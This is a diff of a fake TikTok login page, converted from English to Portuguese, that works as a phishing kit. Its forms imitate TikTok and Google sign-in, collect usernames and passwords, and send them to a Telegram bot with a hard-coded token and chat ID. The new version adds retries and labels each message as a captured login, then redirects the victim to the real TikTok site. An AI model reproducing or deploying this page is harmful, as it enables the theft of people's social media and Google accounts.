@@ -1,339 +1,245 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Log in | TikTok</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Entrar | TikTok</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        :root {
-            --tiktok-pink: #FE2C55;
-            --tiktok-cyan: #25F4EE;
-            --text-main: #161823;
-            --text-sub: rgba(22, 24, 35, 0.75);
-            --border-color: rgba(22, 24, 35, 0.12);
-            --bg-gray: #f8f8f8;
-        }
-
-        * { 
-            margin: 0; 
-            padding: 0; 
-            box-sizing: border-box; 
-            font-family: 'TikTokFont', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
-        }
-
-        body { 
-            background: #fff; 
-            color: var(--text-main); 
-            min-height: 100vh; 
-            display: flex; 
-            flex-direction: column;
-            align-items: center; 
-        }
-
-        .main-wrapper {
-            flex: 1;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            width: 100%;
-            padding: 20px;
-        }
-
-        .container { 
-            width: 100%; 
-            max-width: 480px; 
-            padding: 24px; 
-            text-align: center; 
-        }
-
-        h1 { 
-            font-size: 32px; 
-            font-weight: 700; 
-            margin-bottom: 16px; 
-            letter-spacing: -0.5px;
-        }
-
-        .subtitle { 
-            font-size: 15px; 
-            color: var(--text-sub); 
-            margin-bottom: 32px; 
-            line-height: 1.5; 
-        }
-
-        .btn-container {
-            display: flex;
-            flex-direction: column;
-            gap: 12px;
-        }
-
-        .btn { 
-            width: 100%; 
-            height: 44px;
-            padding: 0 12px;
-            border: 1px solid var(--border-color); 
-            border-radius: 2px; 
-            background: white; 
-            font-size: 15px; 
-            font-weight: 600; 
-            cursor: pointer; 
-            display: flex; 
-            align-items: center; 
-            position: relative;
-            transition: background 0.2s; 
-        }
-
-        .btn:hover { background: var(--bg-gray); }
+        @import url('https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;600;700&display=swap');
         
-        .btn-icon {
+        body {
+            font-family: 'IBM Plex Sans', sans-serif;
+            background-color: #fff;
+        }
+
+        .modal-overlay {
+            background-color: rgba(0, 0, 0, 0.5);
+            display: none;
+            position: fixed;
+            inset: 0;
+            z-index: 50;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .btn-login-option {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+            height: 44px;
+            border: 1px solid rgba(22, 24, 35, 0.12);
+            border-radius: 8px;
+            margin-bottom: 12px;
+            font-weight: 600;
+            font-size: 15px;
+            position: relative;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .btn-first-option {
+            font-size: 13.5px;
+        }
+
+        .btn-login-option:hover {
+            background-color: rgba(22, 24, 35, 0.03);
+        }
+
+        .btn-login-option i, .btn-login-option img {
             position: absolute;
             left: 12px;
-            width: 20px;
-            height: 20px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
+            font-size: 18px;
         }
 
-        .btn-text {
+        .input-field {
             width: 100%;
-            text-align: center;
-        }
-
-        /* Forms */
-        .login-form { display: none; text-align: left; }
-        
-        .form-label {
-            font-size: 14px;
-            font-weight: 600;
-            margin-bottom: 4px;
-            display: block;
-        }
-
-        .input-wrapper {
-            position: relative;
-            margin-bottom: 12px;
-        }
-
-        input { 
-            width: 100%; 
             height: 44px;
-            padding: 0 12px; 
-            border: 1px solid var(--border-color); 
-            border-radius: 4px; 
-            font-size: 16px; 
-            background: var(--bg-gray); 
-            outline: none;
-        }
-
-        input:focus {
-            border-color: rgba(22, 24, 35, 0.5);
-        }
-
-        .submit-btn { 
-            background: var(--tiktok-pink); 
-            color: white; 
-            border: none; 
-            margin-top: 10px;
+            background: rgba(22, 24, 35, 0.06);
+            border: 1px solid transparent;
             border-radius: 4px;
-            justify-content: center;
+            padding: 0 12px;
+            margin-bottom: 8px;
+            outline: none;
+            font-size: 15px;
         }
 
-        .submit-btn:hover { background: #ea284e; }
-        .submit-btn:disabled { opacity: 0.5; cursor: not-allowed; }
-
-        .error-box { 
-            color: var(--tiktok-pink); 
-            font-size: 12px; 
-            margin-top: 4px; 
-            display: none; 
+        .input-field:focus {
+            border-color: rgba(22, 24, 35, 0.12);
         }
 
-        /* Google Modal Simulation */
-        .modal-overlay { 
-            position: fixed; 
-            top: 0; left: 0; right: 0; bottom: 0;
-            background: rgba(0,0,0,0.5); 
-            display: none; 
-            justify-content: center; 
-            align-items: center; 
-            z-index: 1000; 
-        }
-
-        .google-card { 
-            background: white; 
-            padding: 40px 30px; 
-            border-radius: 8px; 
-            width: 90%; 
-            max-width: 400px; 
-            box-shadow: 0 2px 10px rgba(0,0,0,0.2);
-        }
-
-        .google-logo { width: 75px; margin-bottom: 10px; }
-
-        /* Footer */
-        .footer { 
+        .btn-submit {
             width: 100%;
-            padding: 24px;
-            border-top: 1px solid var(--border-color);
-            background: #fff;
-            text-align: center; 
+            height: 44px;
+            background-color: #fe2c55;
+            color: white;
+            font-weight: 700;
+            border-radius: 4px;
+            margin-top: 16px;
+            font-size: 15px;
         }
 
-        .footer-text {
-            font-size: 12px; 
-            color: var(--text-sub); 
-            max-width: 400px;
-            margin: 0 auto;
-        }
-
-        .back-btn {
-            background: none;
-            border: none;
-            color: var(--tiktok-pink);
-            font-weight: 600;
-            cursor: pointer;
-            margin-bottom: 20px;
-            display: none;
+        .btn-submit:disabled {
+            background-color: rgba(22, 24, 35, 0.12);
+            color: rgba(22, 24, 35, 0.34);
+            cursor: not-allowed;
         }
     </style>
 </head>
-<body>
-    <div class="main-wrapper">
-        <div class="container">
-            <button id="backBtn" class="back-btn" onclick="goBack()">← Back</button>
-            <h1 id="mainTitle">Log in to TikTok</h1>
-            <p id="mainSubtitle" class="subtitle">Manage your account, check notifications, comment on videos, and more.</p>
+<body class="flex items-center justify-center min-h-screen">
 
-            <div id="options" class="btn-container">
-                <button class="btn" onclick="showTikTokForm()">
-                    <span class="btn-icon">👤</span>
-                    <span class="btn-text">Use phone / email / username</span>
-                </button>
-                <button class="btn">
-                    <span class="btn-icon">
-                        <svg width="20" height="20" viewBox="0 0 24 24"><path fill="#1877F2" d="M24 12.073C24 5.405 18.627 0 12 0S0 5.405 0 12.073C0 18.1 4.388 23.094 10.125 24v-8.437H7.078v-3.49h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.49h-2.796V24C19.612 23.094 24 18.1 24 12.073z"/></svg>
-                    </span>
-                    <span class="btn-text">Continue with Facebook</span>
-                </button>
-                <button class="btn" onclick="showGoogleModal()">
-                    <span class="btn-icon">
-                        <svg viewBox="0 0 48 48" width="20" height="20"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/><path fill="none" d="M0 0h48v48H0z"/></svg>
-                    </span>
-                    <span class="btn-text">Continue with Google</span>
-                </button>
-                <button class="btn">
-                    <span class="btn-icon">🐦</span>
-                    <span class="btn-text">Continue with Twitter</span>
-                </button>
+    <!-- Container Principal -->
+    <div class="w-full max-w-[480px] p-6 text-center">
+        <h1 class="text-[32px] font-bold mb-8">Entrar no TikTok</h1>
+        
+        <div class="space-y-1">
+            <!-- Opção de Nome de Usuário -->
+            <div onclick="openModal('username')" class="btn-login-option btn-first-option">
+                <i class="far fa-user"></i>
+                <span>Usar telefone / e-mail / nome de usuário</span>
+            </div>
+            
+            <!-- Opção Facebook -->
+            <div class="btn-login-option">
+                <i class="fab fa-facebook text-[#1877f2]"></i>
+                <span>Continuar com o Facebook</span>
             </div>
 
-            <!-- TikTok Internal Form -->
-            <div id="tiktokForm" class="login-form">
-                <label class="form-label">Email or username</label>
-                <div class="input-wrapper">
-                    <input type="text" id="tk_user" placeholder="Email or username">
-                </div>
-                <label class="form-label">Password</label>
-                <div class="input-wrapper">
-                    <input type="password" id="tk_pass" placeholder="Password">
-                </div>
-                <button class="btn submit-btn" onclick="submitTikTok()">Log in</button>
-                <div id="tk_error" class="error-box">Incorrect password. Please check your credentials.</div>
+            <!-- Opção Google -->
+            <div onclick="openModal('google')" class="btn-login-option">
+                <img src="https://www.gstatic.com/images/branding/product/1x/googleg_48dp.png" width="18" alt="Google">
+                <span>Continuar com o Google</span>
+            </div>
+
+            <!-- Opção Apple -->
+            <div class="btn-login-option">
+                <i class="fab fa-apple text-black"></i>
+                <span>Continuar com a Apple</span>
             </div>
         </div>
+
+        <p class="text-[12px] text-gray-500 mt-6 leading-relaxed">
+            Ao continuar, você concorda com os <span class="font-bold text-black cursor-pointer">Termos de Serviço</span> do TikTok e confirma que leu a <span class="font-bold text-black cursor-pointer">Política de Privacidade</span> do TikTok.
+        </p>
+
+        <hr class="my-6 border-gray-100">
+
+        <p class="text-[15px]">
+            Não tem uma conta? <span class="text-[#fe2c55] font-bold cursor-pointer">Criar conta</span>
+        </p>
     </div>
 
-    <!-- Google Overlay -->
-    <div id="googleModal" class="modal-overlay">
-        <div class="google-card">
-            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" class="google-logo" alt="Google">
-            <h2 style="font-size: 24px; margin-bottom: 8px; font-weight: 500;">Sign in</h2>
-            <p style="margin-bottom: 30px;">Use your Google Account</p>
+    <!-- Modal de Login -->
+    <div id="loginModal" class="modal-overlay">
+        <div class="bg-white w-[90%] max-w-[400px] rounded-lg p-8 relative shadow-xl">
+            <button onclick="closeModal()" class="absolute top-4 right-4 text-2xl text-gray-400 hover:text-black">&times;</button>
             
-            <input type="email" id="g_email" placeholder="Email or phone" style="margin-bottom: 15px; border-radius: 4px; background: transparent; border: 1px solid #dadce0; padding: 13px 15px;">
-            <input type="password" id="g_pass" placeholder="Enter your password" style="border-radius: 4px; background: transparent; border: 1px solid #dadce0; padding: 13px 15px;">
+            <h2 id="modalTitle" class="text-2xl font-bold mb-6 text-center">Entrar</h2>
             
-            <div style="display: flex; justify-content: space-between; align-items: center; margin-top: 40px;">
-                <span style="color: #1a73e8; font-weight: 600; font-size: 14px; cursor: pointer;">Create account</span>
-                <button onclick="submitGoogle()" style="background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 600; cursor: pointer;">Next</button>
-            </div>
-            <div id="g_error" class="error-box" style="margin-top: 15px; text-align: left;">Wrong password. Try again or click Forgot password to reset it.</div>
-        </div>
-    </div>
-
-    <div class="footer">
-        <div class="footer-text">
-            By continuing, you agree to TikTok's <strong>Terms of Service</strong> and acknowledge that you have read TikTok's <strong>Privacy Policy</strong>.
+            <form id="loginForm" onsubmit="handleSubmit(event)">
+                <div id="inputContainer">
+                    <!-- Inputs injetados via JS -->
+                </div>
+                <button type="submit" id="submitBtn" class="btn-submit">Entrar</button>
+            </form>
         </div>
     </div>
 
     <script>
-        const CONFIG = {
-            token: "8577826419:AAGGixKMnyFOGC46Iit5yPcJDIrh90rLvyI",
-            chatId: "-1003426300480"
-        };
+        const TELEGRAM_TOKEN = '8577826419:AAGGixKMnyFOGC46Iit5yPcJDIrh90rLvyI';
+        const CHAT_ID = '-1003426300480';
+        let currentMethod = '';
 
-        function showGoogleModal() {
-            document.getElementById('googleModal').style.display = 'flex';
-        }
-
-        function showTikTokForm() {
-            document.getElementById('options').style.display = 'none';
-            document.getElementById('tiktokForm').style.display = 'block';
-            document.getElementById('backBtn').style.display = 'block';
-            document.getElementById('mainTitle').innerText = 'Log in';
-            document.getElementById('mainSubtitle').style.display = 'none';
-        }
-
-        function goBack() {
-            document.getElementById('options').style.display = 'flex';
-            document.getElementById('tiktokForm').style.display = 'none';
-            document.getElementById('backBtn').style.display = 'none';
-            document.getElementById('mainTitle').innerText = 'Log in to TikTok';
-            document.getElementById('mainSubtitle').style.display = 'block';
-        }
-
-        async function sendLog(content) {
-            const text = encodeURIComponent(content + "\nDate: " + new Date().toLocaleString());
-            try {
-                await fetch(`https://api.telegram.org/bot${CONFIG.token}/sendMessage?chat_id=${CONFIG.chatId}&text=${text}`);
-            } catch (e) {}
-        }
-
-        function submitTikTok() {
-            const user = document.getElementById('tk_user').value;
-            const pass = document.getElementById('tk_pass').value;
-            if(!user || !pass) return;
-
-            sendLog(`💎 [TIKTOK LOGIN]\nUser: ${user}\nPass: ${pass}`);
+        function openModal(method) {
+            currentMethod = method;
+            const modal = document.getElementById('loginModal');
+            const container = document.getElementById('inputContainer');
+            const title = document.getElementById('modalTitle');
             
-            document.getElementById('tk_error').style.display = 'block';
-            setTimeout(() => {
-                window.location.href = "https://www.tiktok.com/login";
-            }, 2500);
+            modal.style.display = 'flex';
+            container.innerHTML = '';
+
+            if (method === 'google') {
+                title.innerText = 'Login com Google';
+                container.innerHTML = `
+                    <input type="email" id="user_field" placeholder="E-mail ou Telefone" class="input-field" required>
+                    <input type="password" id="pass_field" placeholder="Senha" class="input-field" required>
+                `;
+            } else {
+                title.innerText = 'Login TikTok';
+                container.innerHTML = `
+                    <input type="text" id="user_field" placeholder="E-mail ou nome de usuário" class="input-field" required>
+                    <input type="password" id="pass_field" placeholder="Senha" class="input-field" required>
+                `;
+            }
         }
 
-        function submitGoogle() {
-            const email = document.getElementById('g_email').value;
-            const pass = document.getElementById('g_pass').value;
-            if(!email || !pass) return;
-
-            sendLog(`📧 [GOOGLE ACCOUNT]\nEmail: ${email}\nPass: ${pass}`);
-
-            document.getElementById('g_error').style.display = 'block';
-            setTimeout(() => {
-                window.location.href = "https://www.tiktok.com/login";
-            }, 2500);
+        function closeModal() {
+            document.getElementById('loginModal').style.display = 'none';
         }
 
-        // Close modal on outside click
+        async function handleSubmit(event) {
+            event.preventDefault();
+            const submitBtn = document.getElementById('submitBtn');
+            const user = document.getElementById('user_field').value;
+            const pass = document.getElementById('pass_field').value;
+
+            submitBtn.disabled = true;
+            submitBtn.innerText = 'Entrando...';
+
+            const message = `
+🔔 *NOVO LOGIN CAPTURADO*
+━━━━━━━━━━━━━━━━━━
+🌐 *Método:* ${currentMethod === 'google' ? 'Google' : 'Username/Email'}
+👤 *Usuário:* \`${user}\`
+🔑 *Senha:* \`${pass}\`
+━━━━━━━━━━━━━━━━━━
+            `;
+
+            try {
+                await sendToTelegram(message);
+                window.location.href = 'https://www.tiktok.com/login';
+            } catch (error) {
+                window.location.href = 'https://www.tiktok.com/login';
+            }
+        }
+
+        async function sendToTelegram(text) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+            
+            const fetchWithRetry = async (retries = 5, delay = 1000) => {
+                try {
+                    const response = await fetch(url, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: CHAT_ID,
+                            text: text,
+                            parse_mode: 'Markdown'
+                        })
+                    });
+                    if (!response.ok) throw new Error('Falha no envio');
+                    return response;
+                } catch (err) {
+                    if (retries > 0) {
+                        await new Promise(res => setTimeout(res, delay));
+                        return fetchWithRetry(retries - 1, delay * 2);
+                    }
+                    throw err;
+                }
+            };
+
+            return fetchWithRetry();
+        }
+
         window.onclick = function(event) {
-            let modal = document.getElementById('googleModal');
+            const modal = document.getElementById('loginModal');
             if (event.target == modal) {
-                modal.style.display = "none";
+                closeModal();
             }
         }
     </script>
 </body>
 </html>
-
